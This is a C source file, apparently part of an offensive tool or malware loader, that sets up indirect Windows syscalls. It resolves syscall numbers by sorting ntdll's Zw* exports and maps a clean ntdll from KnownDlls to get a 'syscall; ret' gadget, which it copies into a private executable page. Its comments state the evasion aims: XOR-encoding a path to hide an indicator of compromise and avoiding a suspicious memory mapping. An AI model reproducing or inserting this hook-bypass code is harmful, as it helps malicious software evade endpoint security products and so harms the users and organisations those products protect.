#include "Syscalls.h"
#include "ApiHashing.h"
#include "Structs.h"
#include "Common.h"

#define MAX_SYSCALLS 500

typedef struct _SYSCALL_ENTRY {
    DWORD Hash;
    DWORD RVA;
    DWORD SSN;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Global array to hold parsed syscalls
static SYSCALL_ENTRY g_Syscalls[MAX_SYSCALLS];
static DWORD g_SyscallCount = 0;
static PVOID g_CleanTrampoline = NULL;

// Helper to sort syscall entries by RVA
static void SortSyscalls() {
    for (DWORD i = 0; i < g_SyscallCount - 1; i++) {
        for (DWORD j = 0; j < g_SyscallCount - i - 1; j++) {
            if (g_Syscalls[j].RVA > g_Syscalls[j + 1].RVA) {
                SYSCALL_ENTRY temp = g_Syscalls[j];
                g_Syscalls[j] = g_Syscalls[j + 1];
                g_Syscalls[j + 1] = temp;
            }
        }
    }
    // Assign SSNs sequentially based on sorted RVA
    for (DWORD i = 0; i < g_SyscallCount; i++) {
        g_Syscalls[i].SSN = i;
    }
}

// Parse a given ntdll image and extract RVAs of all Zw/Nt* functions
static BOOL ParseNtdllSyscalls(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    IMAGE_DATA_DIRECTORY exportDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0 || exportDir.VirtualAddress == 0) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDir.VirtualAddress);

    PDWORD pAddrOfFunctions = (PDWORD)(pBase + pExport->AddressOfFunctions);
    PDWORD pAddrOfNames = (PDWORD)(pBase + pExport->AddressOfNames);
    PWORD pAddrOfOrdinals = (PWORD)(pBase + pExport->AddressOfNameOrdinals);

    g_SyscallCount = 0;

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* pFuncName = (char*)(pBase + pAddrOfNames[i]);
        
        // Only interested in Zw*(Nt) functions
        if (pFuncName[0] == 'Z' && pFuncName[1] == 'w') {
            DWORD dwHash = Djb2HashA(pFuncName);
            // The actual RVA is from the AddressOfFunctions array
            DWORD dwRVA = pAddrOfFunctions[pAddrOfOrdinals[i]];

            if (g_SyscallCount < MAX_SYSCALLS) {
                g_Syscalls[g_SyscallCount].Hash = dwHash;
                g_Syscalls[g_SyscallCount].RVA = dwRVA;
                g_Syscalls[g_SyscallCount].SSN = 0; // Will be assigned later
                g_SyscallCount++;
            }
        }
    }
    return TRUE;
}

// Scans the .text section of the given ntdll for a 'syscall; ret' (0x0F 0x05 0xC3)
static PVOID FindCleanTrampoline(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (custom_strcmp((char*)pSection[i].Name, ".text") == 0) {
            PBYTE pText = pBase + pSection[i].VirtualAddress;
            DWORD dwSize = pSection[i].Misc.VirtualSize;

            for (DWORD j = 0; j < dwSize - 2; j++) {
                if (pText[j] == 0x0F && pText[j + 1] == 0x05 && pText[j + 2] == 0xC3) {
                    return (PVOID)(pText + j);
                }
            }
        }
    }
    return NULL;
}

// Definitions exist in Structs.h
typedef struct _OBJECT_ATTRIBUTES {
  ULONG           Length;
  HANDLE          RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG           Attributes;
  PVOID           SecurityDescriptor;
  PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES);          \
  (p)->RootDirectory = r;                           \
  (p)->Attributes = a;                              \
  (p)->ObjectName = n;                              \
  (p)->SecurityDescriptor = s;                      \
  (p)->SecurityQualityOfService = NULL;             \
}

// Structs matching the parameters
typedef NTSTATUS(NTAPI* pfnNtOpenSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(NTAPI *pfnNtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(NTAPI *pfnNtUnmapViewOfSection_t)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI *pfnNtClose_t)(HANDLE);
typedef NTSTATUS(NTAPI *pfnNtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *pfnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

BOOL Syscalls_Init(void) {
    HMODULE hNtdll = GetModuleHandleH(g_Hash_ntdll);
    if (!hNtdll) return FALSE;

    /* 1. Parse currently loaded ntdll to extract Syscall RVAs */
    if (!ParseNtdllSyscalls((PBYTE)hNtdll)) return FALSE;
    SortSyscalls();

    /* 2. Resolve SSNs needed for bootstrap (all via dirtyTrampoline) */
    DWORD dwSsnOpenSection      = 0;
    DWORD dwSsnMapView          = 0;
    DWORD dwSsnUnmapView        = 0;
    DWORD dwSsnClose            = 0;
    DWORD dwSsnAllocVirtMem     = 0;
    DWORD dwSsnProtectVirtMem   = 0;

    for (DWORD i = 0; i < g_SyscallCount; i++) {
        if (g_Syscalls[i].Hash == g_Hash_ZwOpenSection)           dwSsnOpenSection    = g_Syscalls[i].SSN;
        if (g_Syscalls[i].Hash == g_Hash_ZwMapViewOfSection)      dwSsnMapView        = g_Syscalls[i].SSN;
        if (g_Syscalls[i].Hash == g_Hash_ZwUnmapViewOfSection)    dwSsnUnmapView      = g_Syscalls[i].SSN;
        if (g_Syscalls[i].Hash == g_Hash_ZwClose)                 dwSsnClose          = g_Syscalls[i].SSN;
        if (g_Syscalls[i].Hash == g_Hash_ZwAllocateVirtualMemory) dwSsnAllocVirtMem   = g_Syscalls[i].SSN;
        if (g_Syscalls[i].Hash == g_Hash_ZwProtectVirtualMemory)  dwSsnProtectVirtMem = g_Syscalls[i].SSN;
    }

    // Bootstrap trampoline: taken from the in-memory (potentially hooked) ntdll.
    // Used only during init to open and map the clean KnownDlls copy.
    PVOID dirtyTrampoline = FindCleanTrampoline((PBYTE)hNtdll);
    if (!dirtyTrampoline) return FALSE;

    /* 3. Prepare parameters for \KnownDlls\ntdll.dll — built at runtime
     *    to avoid a plaintext wide-string IOC in .rdata.
     *    XOR key 0xAA encodes: \ K n o w n D l l s \ n t d l l . d l l */
    static const BYTE kKnownDllEnc[] = {
        0xF6,0xE1,0xC4,0xC5,0xDD,0xC4,0xEE,0xC6,
        0xC6,0xD9,0xF6,0xC4,0xDE,0xCE,0xC6,0xC6,
        0x84,0xCE,0xC6,0xC6
    };
    wchar_t wsKnownDll[21];
    for (int ii = 0; ii < 20; ii++) wsKnownDll[ii] = (wchar_t)(kKnownDllEnc[ii] ^ 0xAAu);
    wsKnownDll[20] = L'\0';
    UNICODE_STRING usNtDll;
    usNtDll.Length = (USHORT)(custom_wcslen(wsKnownDll) * sizeof(wchar_t));
    usNtDll.MaximumLength = usNtDll.Length + sizeof(wchar_t);
    usNtDll.Buffer = wsKnownDll;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &usNtDll, 0x40, NULL, NULL); // OBJ_CASE_INSENSITIVE

    HANDLE hSection = NULL;

    SetSyscallParams(dwSsnOpenSection, dirtyTrampoline);
    pfnNtOpenSection_t Sys_NtOpenSection = (pfnNtOpenSection_t)HellsHallSyscall;
    NTSTATUS status = Sys_NtOpenSection(&hSection, 0x0004, &objAttr); // SECTION_MAP_READ

    if (status < 0 || !hSection) {
        // Fallback: KnownDlls unavailable — use dirtyTrampoline (still MEM_IMAGE, acceptable).
        g_CleanTrampoline = dirtyTrampoline;
        return TRUE;
    }

    /* 4. Map the clean ntdll section into our process */
    PVOID pMappedNtdll = NULL;
    SIZE_T viewSize = 0;

	SetSyscallParams(dwSsnMapView, dirtyTrampoline);
    pfnNtMapViewOfSection_t Sys_NtMapViewOfSection = (pfnNtMapViewOfSection_t)HellsHallSyscall;
    status = Sys_NtMapViewOfSection(hSection, (HANDLE)-1, &pMappedNtdll, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);

    if (status < 0 || !pMappedNtdll) {
        // Map failed — close handle and fall back.
		SetSyscallParams(dwSsnClose, dirtyTrampoline);
        pfnNtClose_t Sys_NtClose = (pfnNtClose_t)HellsHallSyscall;
        Sys_NtClose(hSection);
        g_CleanTrampoline = dirtyTrampoline;
        return TRUE;
    }

    /* 5. Locate 'syscall; ret' (0F 05 C3) inside the clean mapped image */
    PVOID pFoundTrampoline = FindCleanTrampoline((PBYTE)pMappedNtdll);

    if (pFoundTrampoline) {
        /* 6. Allocate a private RX buffer and copy the 3 bytes there.
         *    This avoids leaving a zombie MEM_MAPPED view in the process
         *    and ensures g_CleanTrampoline points to a private MEM_PRIVATE region
         *    rather than a suspicious secondary ntdll mapping. */
        PVOID pBuf = NULL;
        SIZE_T bufSize = 0x1000; // one page — minimum allocation granularity
		SetSyscallParams(dwSsnAllocVirtMem, dirtyTrampoline);
        pfnNtAllocateVirtualMemory_t Sys_NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory_t)HellsHallSyscall;
        status = Sys_NtAllocateVirtualMemory((HANDLE)-1, &pBuf, 0, &bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (status >= 0 && pBuf) {
            // Copy 'syscall; ret' into private buffer
            ((PBYTE)pBuf)[0] = 0x0F;
            ((PBYTE)pBuf)[1] = 0x05;
            ((PBYTE)pBuf)[2] = 0xC3;

            // Harden to RX — remove write permission
            PVOID pProtBase = pBuf;
            SIZE_T protSize = bufSize;
            ULONG ulOldProtect = 0;

			SetSyscallParams(dwSsnProtectVirtMem, dirtyTrampoline);
            pfnNtProtectVirtualMemory_t Sys_NtProtectVirtualMemory = (pfnNtProtectVirtualMemory_t)HellsHallSyscall;
            Sys_NtProtectVirtualMemory((HANDLE)-1, &pProtBase, &protSize, PAGE_EXECUTE_READ, &ulOldProtect);

            g_CleanTrampoline = pBuf;
        } else {
            // Allocation failed — fall back to dirty trampoline
            g_CleanTrampoline = dirtyTrampoline;
        }
    } else {
        g_CleanTrampoline = dirtyTrampoline;
    }

    /* 7. Clean up: unmap the view and close the section handle.
     *    g_CleanTrampoline now points to our private copy — the mapped view is no longer needed. */
	SetSyscallParams(dwSsnUnmapView, dirtyTrampoline);
    pfnNtUnmapViewOfSection_t Sys_NtUnmapViewOfSection = (pfnNtUnmapViewOfSection_t)HellsHallSyscall;
    Sys_NtUnmapViewOfSection((HANDLE)-1, pMappedNtdll);

	SetSyscallParams(dwSsnClose, dirtyTrampoline);
    pfnNtClose_t Sys_NtClose = (pfnNtClose_t)HellsHallSyscall;
    Sys_NtClose(hSection);

    return TRUE;
}

BOOL Syscalls_GetParamsByHash(DWORD dwApiHash, PDWORD pdwSsn, PVOID* ppTrampoline) {
    if (!pdwSsn || !ppTrampoline || !g_CleanTrampoline) return FALSE;

    // Use the Zw* equivalent hash for Nt* functions. 
    // Usually Nt and Zw resolve to the same SSN and logic, but this array is built using Zw names.
    // In this StubNtApi mappings, if we use HASH_Nt*, we should search for HASH_Zw*
    // A simple trick: if we didn't find the hash, we can search by replacing 'N'/'t' with 'Z'/'w' before hashing.
    // But since ApiHashing hashes the exact string, the caller must pass the HASH of the Zw function or we check both.
    for (DWORD i = 0; i < g_SyscallCount; i++) {
        if (g_Syscalls[i].Hash == dwApiHash) {
            *pdwSsn = g_Syscalls[i].SSN;
            *ppTrampoline = g_CleanTrampoline;
            return TRUE;
        }
    }
    return FALSE;
}
